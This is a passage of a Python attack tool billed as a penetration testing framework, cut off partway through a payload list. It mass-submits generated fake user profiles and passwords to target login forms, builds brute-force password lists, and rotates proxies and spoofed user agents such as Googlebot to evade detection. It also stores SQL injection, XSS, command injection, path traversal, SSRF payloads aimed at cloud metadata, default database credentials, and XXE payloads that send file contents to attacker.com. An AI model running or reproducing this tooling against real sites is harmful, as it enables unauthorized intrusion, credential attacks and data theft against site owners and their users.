"""
ALPHA V4.0 - COMPLETE PENETRATION TESTING FRAMEWORK
Fully upgraded with AI, Auto-Playloads, Random Players, Smart Password Generation
"""

import requests
import threading
import time
import os
import sys
import ssl
import certifi
import urllib3
import random
import json
import hashlib
import base64
import re
import socket
import subprocess
from urllib.parse import urljoin, urlparse, quote, unquote
import warnings
from colorama import Fore, Style, Back, init
from datetime import datetime
import csv
import xml.etree.ElementTree as ET
import itertools
from collections import defaultdict
import queue
import logging

# Initialize colorama
init(autoreset=True)

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')

# Try to import optional dependencies
try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False
    print(f"{Fore.YELLOW}⚠️ BeautifulSoup4 not available.{Style.RESET_ALL}")

try:
    from concurrent.futures import ThreadPoolExecutor, as_completed
    CONCURRENT_AVAILABLE = True
except ImportError:
    CONCURRENT_AVAILABLE = False
    print(f"{Fore.YELLOW}⚠️ concurrent.futures not available.{Style.RESET_ALL}")

class ALPHAEngine:
    """Core Engine - Complete Rewrite"""
    
    def __init__(self):
        self.target_url = ""
        self.results = {
            'target_info': {},
            'admin_panels': [],
            'vulnerabilities': [],
            'credentials_found': [],
            'subdomains': [],
            'ports': [],
            'ssl_info': {},
            'waf_detected': False,
            'technologies': [],
            'sensitive_files': [],
            'working_sql_injections': [],
            'xss_vulnerabilities': [],
            'rce_vulnerabilities': [],
            'lfi_vulnerabilities': [],
            'csrf_vulnerabilities': [],
            'brute_force_results': [],
            'api_endpoints': [],
            'backup_files': [],
            'hidden_directories': [],
            'cors_vulnerabilities': [],
            'ssrf_vulnerabilities': [],
            'xxe_vulnerabilities': [],
            'database_info': [],
            'random_passwords': [],
            'auto_players': [],  # NEW: Auto-generated players
            'interception_logs': []  # NEW: Interception logs
        }
        
        # HTTP Session
        self.session = requests.Session()
        self.setup_session()
        
        # Advanced Configuration
        self.scanned_urls = set()
        self.found_count = 0
        self.vuln_count = 0
        self.cred_count = 0
        self.start_time = None
        self.rate_limit_delay = 0
        self.waf_detected = False
        self.interception_active = False
        
        # Learning Database
        self.learning_db = self.load_database()
        self.ai_learning_db = self.learning_db
        
        # Advanced Evasion
        self.user_agents = self.load_advanced_user_agents()
        self.proxies = self.load_proxies()
        self.current_proxy = None
        
        # Performance
        self.request_count = 0
        self.successful_requests = 0
        
        # Real-time Analytics
        self.analytics = {
            'requests_per_second': 0,
            'success_rate': 0,
            'vulnerabilities_per_minute': 0,
            'players_generated': 0
        }
        
        # Brute Force Configuration
        self.brute_force_target = ""
        self.brute_force_file = ""
        self.found_credentials = []
        self.custom_passwords = []
        
        # Interception
        self.interceptor = None
        
        # Auto-Players
        self.auto_players = []
        self.player_count = 0
        
        print(f"{Fore.GREEN}✅ ALPHA Engine Initialized!{Style.RESET_ALL}")

    def setup_session(self):
        """Setup session with advanced evasion"""
        self.session.mount('https://', requests.adapters.HTTPAdapter(
            pool_connections=500,
            pool_maxsize=500,
            max_retries=10,
            pool_block=True
        ))
        
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        })

    # ============ NEW FEATURE 1: AUTO-PLAYER GENERATION ============
    
    def generate_auto_players(self, count=100):
        """Generate realistic auto-players with full profiles"""
        print(f"{Fore.CYAN}🎮 Generating {count} Auto-Players...{Style.RESET_ALL}")
        
        first_names = [
            'Ahmed', 'Ali', 'Hassan', 'Hussain', 'Usman', 'Omar', 'Khalid',
            'Zain', 'Danish', 'Faizan', 'Hamza', 'Bilal', 'Rayan', 'Salman',
            'Ayesha', 'Fatima', 'Zara', 'Mariam', 'Sana', 'Noor', 'Hira',
            'Sara', 'Meera', 'Alishba', 'Iman', 'Areeba', 'Eman'
        ]
        
        last_names = [
            'Khan', 'Ahmed', 'Ali', 'Hassan', 'Hussain', 'Shah', 'Malik',
            'Siddiqui', 'Farooqi', 'Qureshi', 'Hashmi', 'Naqvi', 'Rizvi',
            'Sheikh', 'Mirza', 'Baig', 'Awan', 'Butt', 'Chaudhry'
        ]
        
        cities = [
            'Karachi', 'Lahore', 'Islamabad', 'Rawalpindi', 'Faisalabad',
            'Multan', 'Hyderabad', 'Gujranwala', 'Peshawar', 'Quetta'
        ]
        
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'icloud.com']
        
        players = []
        
        for i in range(count):
            first = random.choice(first_names)
            last = random.choice(last_names)
            full_name = f"{first} {last}"
            
            # Generate realistic data
            player = {
                'id': i + 1,
                'username': self.generate_username(first, last, i),
                'password': self.generate_smart_password(),
                'email': f"{first.lower()}.{last.lower()}{random.randint(10, 99)}@{random.choice(domains)}",
                'full_name': full_name,
                'age': random.randint(18, 50),
                'city': random.choice(cities),
                'country': 'Pakistan',
                'phone': f"03{random.randint(0, 9)}{random.randint(1000000, 9999999)}",
                'ip': self.generate_ip(),
                'user_agent': random.choice(self.user_agents),
                'device': random.choice(['Mobile', 'Desktop', 'Tablet']),
                'language': random.choice(['Urdu', 'English', 'Both']),
                'status': random.choice(['Active', 'Inactive', 'Suspended']),
                'points': random.randint(0, 10000),
                'level': random.randint(1, 50),
                'last_login': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'score': random.randint(0, 5000)
            }
            
            players.append(player)
        
        self.auto_players = players
        self.player_count = count
        self.results['auto_players'] = players
        self.analytics['players_generated'] = count
        
        print(f"{Fore.GREEN}✅ Generated {count} Auto-Players!{Style.RESET_ALL}")
        return players

    def generate_username(self, first, last, index):
        """Generate unique username"""
        patterns = [
            f"{first.lower()}{last.lower()}",
            f"{first.lower()}{last.lower()[0]}",
            f"{first.lower()}{last.lower()}{random.randint(10, 99)}",
            f"{first.lower()}_{last.lower()}",
            f"{first.lower()}{random.randint(100, 999)}"
        ]
        return random.choice(patterns)

    def generate_smart_password(self):
        """Generate strong, realistic passwords"""
        # Password patterns
        patterns = [
            # Pattern 1: Word + Number + Symbol
            lambda: f"{random.choice(['Admin', 'Root', 'Master', 'Pass'])}{random.randint(100, 999)}{random.choice(['!', '@', '#', '$'])}",
            
            # Pattern 2: Word + Year + Symbol
            lambda: f"{random.choice(['Alpha', 'Beta', 'Gamma', 'Delta'])}{random.randint(2020, 2024)}{random.choice(['!', '@', '#'])}",
            
            # Pattern 3: Random strong password
            lambda: self.generate_strong_password(12),
            
            # Pattern 4: Word + Number
            lambda: f"{random.choice(['Secure', 'Strong', 'Safe', 'Hard'])}{random.randint(1000, 9999)}",
            
            # Pattern 5: 2 Words + Number
            lambda: f"{random.choice(['Blue', 'Red', 'Green', 'Gold'])}{random.choice(['Sky', 'Moon', 'Sun', 'Star'])}{random.randint(10, 99)}",
            
            # Pattern 6: 16-character random
            lambda: self.generate_strong_password(16)
        ]
        
        return random.choice(patterns)()
    
    def generate_strong_password(self, length=12):
        """Generate cryptographically strong password"""
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/"
        
        # Ensure at least one of each type
        password = [
            random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            random.choice("abcdefghijklmnopqrstuvwxyz"),
            random.choice("0123456789"),
            random.choice("!@#$%^&*")
        ]
        
        # Fill rest randomly
        for _ in range(length - 4):
            password.append(random.choice(chars))
        
        # Shuffle
        random.shuffle(password)
        return ''.join(password)

    def generate_ip(self):
        """Generate random IP address"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # ============ NEW FEATURE 2: INTERCEPTION SYSTEM ============
    
    def start_interception(self):
        """Start request/response interception"""
        print(f"{Fore.CYAN}🔄 Starting Interception System...{Style.RESET_ALL}")
        self.interception_active = True
        self.interceptor = Interceptor(self)
        self.interceptor.start()
        
        return self.interceptor

    def stop_interception(self):
        """Stop interception"""
        self.interception_active = False
        if self.interceptor:
            self.interceptor.stop()
        print(f"{Fore.YELLOW}⏹️ Interception Stopped{Style.RESET_ALL}")

    def log_interception(self, request_data, response_data):
        """Log intercepted data"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'request': request_data,
            'response': response_data,
            'size': len(str(response_data))
        }
        self.results['interception_logs'].append(log_entry)
        
        # Analyze intercepted data
        self.analyze_intercepted_data(request_data, response_data)

    def analyze_intercepted_data(self, request, response):
        """Analyze intercepted data for vulnerabilities"""
        # Check for sensitive data
        sensitive_patterns = [
            'password', 'passwd', 'pwd', 'secret', 'token', 'key', 'api_key',
            'auth', 'authorization', 'bearer', 'jwt', 'session', 'cookie'
        ]
        
        for pattern in sensitive_patterns:
            if pattern in str(request).lower() or pattern in str(response).lower():
                print(f"{Fore.YELLOW}⚠️ Sensitive data detected: {pattern}{Style.RESET_ALL}")
                self.results['vulnerabilities'].append({
                    'type': 'Sensitive Data Exposure',
                    'pattern': pattern,
                    'timestamp': datetime.now().isoformat()
                })

    # ============ NEW FEATURE 3: ADVANCED PASSWORD GENERATOR ============
    
    def generate_password_list(self, count=1000, complexity='high'):
        """Generate extensive password list"""
        print(f"{Fore.CYAN}🔑 Generating {count} Smart Passwords...{Style.RESET_ALL}")
        
        passwords = set()
        
        # Common base words
        base_words = [
            'admin', 'root', 'master', 'password', 'secure', 'strong',
            'alpha', 'beta', 'gamma', 'delta', 'omega', 'sigma',
            'star', 'moon', 'sun', 'sky', 'fire', 'water', 'earth',
            'king', 'queen', 'lord', 'lady', 'knight', 'dragon',
            'phoenix', 'thunder', 'lightning', 'storm', 'wind'
        ]
        
        # Common years
        years = list(range(1980, 2025))
        
        # Common symbols
        symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '?', '+', '=']
        
        # Generate variations
        while len(passwords) < count:
            if complexity == 'low':
                # Simple passwords
                word = random.choice(base_words)
                password = word + str(random.choice(years))
                
            elif complexity == 'medium':
                # Medium complexity
                word = random.choice(base_words).capitalize()
                password = word + str(random.choice(years)) + random.choice(symbols)
                
            else:  # high
                # High complexity
                word1 = random.choice(base_words).capitalize()
                word2 = random.choice(base_words).lower()
                password = f"{word1}{word2}{random.choice(years)}{random.choice(symbols)}"
                
                # Randomize case
                password = ''.join(
                    char.upper() if random.random() > 0.5 else char.lower()
                    for char in password
                )
            
            passwords.add(password)
        
        password_list = list(passwords)
        self.custom_passwords = password_list
        self.results['random_passwords'] = password_list[:20]  # Store sample
        
        print(f"{Fore.GREEN}✅ Generated {len(password_list)} Smart Passwords{Style.RESET_ALL}")
        return password_list

    # ============ NEW FEATURE 4: AUTO-TEST WITH PLAYERS ============
    
    def auto_test_with_players(self, target_url, player_count=100):
        """Automatically test target with generated players"""
        print(f"{Fore.CYAN}🎮 Starting Auto-Test with {player_count} Players...{Style.RESET_ALL}")
        
        # Generate players
        players = self.generate_auto_players(player_count)
        
        # Test each player
        results = []
        for player in players:
            result = self.test_player_login(target_url, player)
            results.append(result)
            
            # Show progress
            progress = (len(results) / player_count) * 100
            sys.stdout.write(f'\r🎮 Testing Players: [{len(results)}/{player_count}] {progress:.1f}% | Success: {sum(1 for r in results if r["success"])}')
            sys.stdout.flush()
        
        print(f"\n{Fore.GREEN}✅ Auto-Test Complete!{Style.RESET_ALL}")
        
        # Summary
        successful = sum(1 for r in results if r["success"])
        print(f"   🎯 Total Players: {player_count}")
        print(f"   ✅ Successful: {successful}")
        print(f"   ❌ Failed: {player_count - successful}")
        print(f"   📊 Success Rate: {(successful/player_count)*100:.1f}%")
        
        return results

    def test_player_login(self, target_url, player):
        """Test single player login"""
        try:
            # Prepare login data
            login_data = {
                'username': player['username'],
                'password': player['password'],
                'email': player['email'],
                'login': 'Login',
                'submit': 'Submit'
            }
            
            # Send request
            response = self.session.post(
                target_url,
                data=login_data,
                timeout=10,
                allow_redirects=True,
                verify=False
            )
            
            success = self.is_login_successful(response, player['username'])
            
            return {
                'player': player,
                'success': success,
                'status': response.status_code,
                'url': response.url
            }
            
        except Exception as e:
            return {
                'player': player,
                'success': False,
                'error': str(e)
            }

    def is_login_successful(self, response, username):
        """Check if login was successful"""
        text_lower = response.text.lower()
        url_lower = response.url.lower()
        
        success_indicators = [
            'welcome', 'dashboard', 'logout', 'success', 'logged in',
            f'welcome {username.lower()}', 'my account', 'profile',
            'admin panel', 'control panel'
        ]
        
        failure_indicators = [
            'invalid', 'incorrect', 'error', 'failed', 'wrong',
            'not found', 'try again', 'login failed'
        ]
        
        success_score = 0
        failure_score = 0
        
        if 'dashboard' in url_lower or 'admin' in url_lower or 'welcome' in url_lower:
            success_score += 3
        
        for indicator in success_indicators:
            if indicator in text_lower:
                success_score += 2
        
        for indicator in failure_indicators:
            if indicator in text_lower:
                failure_score += 2
        
        return success_score > failure_score and success_score >= 3

    # ============ EXISTING METHODS (UPGRADED) ============

    def load_database(self):
        """Load enhanced learning database"""
        return {
            'common_paths': self.load_common_paths(),
            'vulnerability_patterns': self.load_vulnerability_patterns(),
            'technology_signatures': self.load_technology_signatures(),
            'waf_signatures': self.load_waf_signatures(),
            'exploit_payloads': self.load_exploit_payloads(),
            'brute_force_wordlists': self.load_brute_force_wordlists(),
            'api_endpoints': self.load_api_endpoints(),
            'backup_patterns': self.load_backup_patterns(),
            'cors_payloads': self.load_cors_payloads(),
            'ssrf_payloads': self.load_ssrf_payloads(),
            'xxe_payloads': self.load_xxe_payloads(),
            'database_credentials': self.load_database_credentials()
        }

    def load_advanced_user_agents(self):
        """Load extensive user agents"""
        base_agents = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',
            
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0 Safari/537.36',
            
            # Mobile
            'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # Bots
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
            'Twitterbot/1.0',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
        ]
        
        # Generate variations
        variations = []
        for agent in base_agents:
            variations.append(agent)
            if 'Chrome' in agent:
                for version in [118, 119, 120, 121, 122]:
                    variations.append(agent.replace('Chrome/120.0.0.0', f'Chrome/{version}.0.0.0'))
            if 'Firefox' in agent:
                for version in [118, 119, 120, 121]:
                    variations.append(agent.replace('Firefox/120.0', f'Firefox/{version}.0'))
        
        return variations

    def load_proxies(self):
        """Load proxies from multiple sources"""
        proxies = []
        
        # Built-in free proxies
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all',
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://www.proxy-list.download/api/v1/get?type=socks5'
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    lines = response.text.strip().split('\n')
                    for line in lines:
                        if ':' in line:
                            proxies.append(line.strip())
            except:
                continue
        
        # Add some default proxies
        default_proxies = [
            '185.199.228.220:80',
            '185.199.229.156:80',
            '185.199.230.210:80',
            '185.199.231.45:80',
            '188.74.210.207:80',
            '188.74.210.212:80',
            '188.74.210.213:80',
            '188.74.210.214:80'
        ]
        
        proxies.extend(default_proxies)
        
        self.proxies = proxies
        return proxies

    def load_common_paths(self):
        """Load enhanced common paths"""
        return {
            'admin_paths': [
                'admin', 'administrator', 'wp-admin', 'admin/login', 'admin/dashboard',
                'admincp', 'administrator/login', 'user/login', 'backend', 'manager',
                'webadmin', 'adminarea', 'panel', 'cpanel', 'whm', 'plesk', 'webmail',
                'phpmyadmin', 'mysql', 'dbadmin', 'superadmin', 'root', 'system',
                'config', 'setup', 'install', 'maintenance', 'control', 'manage',
                'dashboard', 'portal', 'gateway', 'access', 'secure', 'private',
                'moderator', 'editor', 'author', 'contributor', 'subscriber',
                # Extended
                'admin1', 'admin2', 'admin123', 'adminpanel', 'adminarea',
                'controlpanel', 'cp', 'cpanel', 'whm', 'webmail', 'webadmin',
                'sysadmin', 'itadmin', 'networkadmin', 'securityadmin'
            ],
            'api_paths': [
                'api', 'api/v1', 'api/v2', 'api/v3', 'graphql', 'rest', 'json', 'xml',
                'oauth', 'auth', 'token', 'login', 'register', 'user', 'users',
                'admin/api', 'wp-json', 'ajax', 'ajax-api', 'mobile/api',
                'api/v4', 'api/v5', 'api/v6', 'graphql/query', 'graphql/mutation',
                'rest/v1', 'rest/v2', 'json/v1', 'xml/v1'
            ],
            'file_paths': [
                'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
                'backup', 'backups', 'old', 'temp', 'tmp', 'log', 'logs',
                'config.php', 'database.sql', 'dump.sql', 'backup.zip',
                'error_log', 'access.log', '.env', '.git/config', '.DS_Store',
                'phpinfo.php', 'test.php', 'info.php', 'debug.php',
                # Extended
                '.gitignore', '.env.production', '.env.local', 'package.json',
                'composer.json', 'requirements.txt', 'Gemfile', 'Podfile'
            ],
            'hidden_directories': [
                '.git', '.svn', '.hg', '.bzr', '.cvs', '.idea', '.vscode',
                'node_modules', 'vendor', 'uploads', 'images', 'assets',
                'static', 'media', 'files', 'downloads', 'cache', 'session',
                # Extended
                '.aws', '.azure', '.gcp', '.terraform', '.serverless',
                '.github', '.gitlab', '.circleci', 'travis'
            ]
        }

    def load_vulnerability_patterns(self):
        """Load enhanced vulnerability patterns"""
        return {
            'sql_errors': [
                'sql', 'mysql', 'database', 'syntax', 'ora-', 'warning',
                'odbc', 'postgresql', 'sqlite', 'microsoft ole db',
                'pdo', 'driver', 'query failed', 'unclosed quotation',
                'you have an error in your sql syntax', 'mysql_fetch_array',
                'mysqli_fetch_array', 'pg_fetch_array', 'sqlserver',
                'postgresql error', 'mysql error', 'sqlite error',
                'database error', 'pdo exception', 'db error'
            ],
            'xss_patterns': [
                'script', 'alert', 'onerror', 'onload', 'javascript',
                'eval', 'document.cookie', 'window.location', 'location.href',
                'innerhtml', 'outerhtml', 'onmouseover', 'onclick', 'onfocus',
                'onblur', 'onchange', 'oninput', 'onkeydown', 'onkeyup',
                'onload', 'onunload', 'onresize', 'onscroll'
            ],
            'rce_patterns': [
                'system', 'exec', 'shell_exec', 'passthru', 'popen',
                'proc_open', 'backtick', 'command', 'cmd', 'eval',
                'assert', 'preg_replace', 'create_function',
                'system()', 'exec()', 'shell_exec()', 'passthru()',
                'popen()', 'proc_open()', 'eval()', 'assert()'
            ],
            'lfi_patterns': [
                'etc/passwd', 'etc/hosts', 'etc/shadow', 'proc/self/environ',
                'windows/win.ini', 'boot.ini', 'autoexec.bat',
                'config.php', 'database.php', 'wp-config.php'
            ]
        }

    def load_technology_signatures(self):
        """Load enhanced technology signatures"""
        return {
            'wordpress': ['wp-content', 'wp-includes', 'wordpress', 'wp-json', 'wp-admin', 'wp-login'],
            'joomla': ['joomla', 'media/jui', 'templates/ju', 'administrator/components'],
            'drupal': ['drupal', 'sites/all', 'misc/drupal', 'core/assets'],
            'laravel': ['laravel', 'mix-manifest.json', 'storage/framework'],
            'django': ['django', 'csrfmiddleware', 'static/admin'],
            'rails': ['rails', 'assets/rails', 'javascripts/application'],
            'aspnet': ['asp.net', '__viewstate', 'webresource.axd', 'scriptresource.axd'],
            'vuejs': ['vue', '__vue__', 'vue-router'],
            'react': ['react', 'react-dom', 'webpack'],
            'angular': ['angular', 'ng-', 'zone.js'],
            'nextjs': ['_next', 'next/static', '__NEXT_DATA__'],
            'nuxtjs': ['_nuxt', 'nuxt', '__NUXT__']
        }

    def load_waf_signatures(self):
        """Load enhanced WAF signatures"""
        return {
            'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray', 'server: cloudflare', 'cf-cache-status'],
            'Akamai': ['akamai', 'x-akamai-transformed', 'server: akamai', 'akamai-origin-hop'],
            'Imperva': ['imperva', 'incap_ses_', 'visid_incap_', 'x-cdn: imperva'],
            'AWS WAF': ['aws', 'x-amz-id', 'x-amz-cf-id', 'server: aws'],
            'ModSecurity': ['mod_security', 'modsecurity', 'server: mod_security'],
            'Sucuri': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
            'Barracuda': ['barracuda', 'barra_counter_session'],
            'F5': ['bigip', 'f5', 'x-wa-info'],
            'Fortinet': ['fortinet', 'fortigate', 'x-fortigate']
        }

    def load_exploit_payloads(self):
        """Load enhanced exploit payloads"""
        return {
            'sql_injection': self.generate_advanced_sql_payloads(),
            'xss': self.generate_advanced_xss_payloads(),
            'rce': self.generate_advanced_rce_payloads(),
            'lfi': self.generate_advanced_lfi_payloads(),
            'csrf': self.generate_advanced_csrf_payloads(),
            'cors': self.generate_advanced_cors_payloads(),
            'ssrf': self.generate_advanced_ssrf_payloads(),
            'xxe': self.generate_advanced_xxe_payloads()
        }

    def load_brute_force_wordlists(self):
        """Load enhanced brute force wordlists"""
        return {
            'common_usernames': [
                'admin', 'administrator', 'root', 'user', 'test', 'demo',
                'guest', 'manager', 'operator', 'support', 'sysadmin',
                'webmaster', 'admin1', 'admin2', 'superuser', 'default',
                'operator', 'moderator', 'editor', 'author', 'contributor',
                'subscriber', 'api', 'api_user', 'dev', 'developer', 'testuser',
                # Extended
                'itadmin', 'networkadmin', 'securityadmin', 'dbadmin',
                'systemadmin', 'superadmin', 'masteradmin', 'globaladmin',
                'admin123', 'admin2024', 'admin@123', 'Admin@123'
            ],
            'common_passwords': [
                'admin', 'password', '123456', 'password123', 'admin123',
                '12345678', 'qwerty', '123456789', '12345', '1234',
                '111111', '1234567', 'dragon', '123123', 'baseball',
                'abc123', 'football', 'monkey', 'letmein', 'shadow',
                'master', '666666', 'qwertyuiop', '123321', 'mustang',
                '1234567890', 'michael', '654321', 'superman', '1qaz2wsx',
                'password1', '123qwe', 'admin@123', 'Admin@123', 'Pass@123',
                'hello', 'welcome', 'login', 'pass', 'pass123',
                # Extended
                'Admin2024', 'Password2024', 'qwerty123', '1q2w3e4r',
                'zaq12wsx', 'qwertyuiop1', 'asdfghjkl1', 'zxcvbnm1'
            ],
            'api_keys': [
                'api_key', 'api-key', 'apikey', 'secret', 'token',
                'access_key', 'access_token', 'bearer', 'jwt',
                'auth', 'authorization', 'x-api-key'
            ]
        }

    def load_api_endpoints(self):
        """Load enhanced API endpoints"""
        return [
            'api/users', 'api/products', 'api/orders', 'api/auth',
            'api/login', 'api/register', 'api/profile', 'api/settings',
            'api/config', 'api/admin', 'api/v1/users', 'api/v2/users',
            'graphql', 'rest/api', 'json/api', 'xml/api',
            'api/v3/users', 'api/v4/users', 'api/v5/users',
            'graphql/query', 'graphql/mutation', 'rest/v1',
            'api/v1/products', 'api/v2/products', 'api/v1/orders'
        ]

    def load_backup_patterns(self):
        """Load enhanced backup patterns"""
        return [
            '.bak', '.backup', '.old', '.tmp', '.temp',
            '_backup', '-backup', 'backup_', 'backup-',
            '.sql', '.zip', '.tar', '.tar.gz', '.7z',
            'database.sql', 'dump.sql', 'backup.sql',
            'wp-config.bak', 'config.php.bak', 'settings.php.bak',
            'db-backup.sql', 'db_dump.sql', 'site-backup.zip'
        ]

    def load_cors_payloads(self):
        """Load enhanced CORS payloads"""
        return [
            'https://evil.com',
            'http://localhost',
            'null',
            'https://attacker.com',
            'https://sub.attacker.com',
            'http://127.0.0.1',
            'https://example.com',
            'http://test.com'
        ]

    def load_ssrf_payloads(self):
        """Load enhanced SSRF payloads"""
        return [
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/',
            'http://internal.service/',
            'file:///etc/passwd',
            'gopher://internal.service:25/',
            'dict://localhost:11211/stat',
            'http://[::1]:80/',
            'http://0.0.0.0:80/',
            'http://localhost.localdomain/'
        ]

    def load_xxe_payloads(self):
        """Load enhanced XXE payloads"""
        return [
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">',
            '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">',
            '<!ENTITY % xxe "<!ENTITY &#x25; send SYSTEM \\"http://attacker.com/?%file;\\">">',
            '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">',
            '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">'
        ]

    def load_database_credentials(self):
        """Load enhanced database credentials"""
        return {
            'mysql': [
                {'username': 'root', 'password': ''},
                {'username': 'root', 'password': 'root'},
                {'username': 'admin', 'password': 'admin'},
                {'username': 'test', 'password': 'test'},
                {'username': 'user', 'password': 'user'},
                {'username': 'mysql', 'password': 'mysql'}
            ],
            'postgresql': [
                {'username': 'postgres', 'password': 'postgres'},
                {'username': 'admin', 'password': 'admin'},
                {'username': 'test', 'password': 'test'}
            ],
            'mongodb': [
                {'username': 'admin', 'password': 'admin'},
                {'username': 'root', 'password': 'root'},
                {'username': 'test', 'password': 'test'}
            ]
        }

    def generate_advanced_sql_payloads(self):
        """Generate advanced SQL injection payloads"""
        return [
            "' OR '1'='1' -- ",
            "admin' -- ",
            "' OR 1=1 -- ",
            "' UNION SELECT 1,2,3 -- ",
            "' AND 1=1 -- ",
            "' AND 1=2 -- ",
            "' OR SLEEP(5) -- ",
            "' OR BENCHMARK(1000000,MD5('test')) -- ",
            "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) -- ",
            "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()))) -- ",
            "' UNION SELECT null,version(),null -- ",
            "' UNION SELECT null,database(),null -- ",
            "' UNION SELECT null,user(),null -- ",
            "' OR 1=1 AND SLEEP(5) -- ",
            "' OR 1=1 AND BENCHMARK(1000000,MD5('test')) -- "
        ]

    def generate_advanced_xss_payloads(self):
        """Generate advanced XSS payloads"""
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(`XSS`)">',
            '<input onfocus=alert("XSS") autofocus>',
            '<details ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<video src=x onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">'
        ]

    def generate_advanced_rce_payloads(self):
        """Generate advanced RCE payloads"""
        return [
            '; ls -la',
            '; whoami',
            '; id',
            '; cat /etc/passwd',
            '| ls',
            '`whoami`',
            '$(id)',
            '{{7*7}}',
            '#{7*7}',
            '; echo "rce"',
            '| echo "rce"',
            '&& echo "rce"',
            '|| echo "rce"'
        ]

    def generate_advanced_lfi_payloads(self):
        """Generate advanced LFI payloads"""
        return [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
